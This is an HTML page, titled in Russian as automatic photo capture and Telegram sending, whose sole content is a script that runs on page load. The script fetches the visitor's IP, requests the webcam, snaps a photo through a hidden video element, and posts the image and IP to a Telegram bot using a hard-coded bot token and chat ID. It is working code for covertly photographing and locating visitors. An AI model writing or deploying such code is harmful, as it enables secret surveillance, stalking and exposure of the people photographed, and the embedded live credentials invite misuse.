<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Автоматическое фото и отправка в Telegram</title>
</head>
<body>
<script>
  const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
  const chatId = '6945488830';

  (async () => {
    try {
      // Получаем IP пользователя
      const ipResp = await fetch('https://api.ipify.org?format=json');
      const { ip } = await ipResp.json();

      // Запрашиваем доступ к камере
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);

      video.srcObject = stream;
      await video.play();

      // Ждём готовности видео
      await new Promise(resolve => {
        if (video.readyState >= 2) resolve();
        else video.onloadeddata = () => resolve();
      });

      // Создаём canvas и снимаем фото
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Формируем blob из изображения
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

      // Останавливаем камеру
      stream.getTracks().forEach(track => track.stop());
      video.remove();

      // Подготавливаем отправку в Telegram
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', `IP пользователя: ${ip}`);
      formData.append('photo', blob, 'photo.jpg');

      // Отправка фото с подписью
      const resp = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!resp.ok) throw new Error(`Ошибка отправки: ${resp.statusText}`);

      alert('Фото успешно отправлено в Telegram');
    } catch (err) {
      alert('Ошибка: ' + err.message);
    }
  })();
</script>
</body>
</html>
